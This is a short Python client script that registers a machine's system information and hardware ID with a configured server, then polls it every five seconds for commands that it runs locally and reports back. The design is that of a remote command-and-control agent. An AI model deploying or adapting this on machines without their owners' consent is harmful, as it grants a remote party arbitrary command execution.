'''Main script used as a lisener'''
import configparser
from classes.sys_info import SystemInfo
from classes.api_requests import Requests
import time

def start_listen(sys, api, cmds):
    for cmd in cmds:
        sys.run_cmd(cmd['cmd'])
        api.update_cmd_status(cmd['id'])

def main():
    ''' Main function which is used to initialized classes'''
    config = configparser.ConfigParser()
    config.read('settings/config.ini')
    sys = SystemInfo()
    api = Requests(sys.info['hwid'], config['HOST'])
    api.post_new_setup(sys.info)
    input("You want to start listen? Press any key")
    while True:
        cmds = api.get_command(api.last_resp['id'])
        start_listen(sys, api,cmds)
        time.sleep(5)

if __name__ == "__main__":
    main()
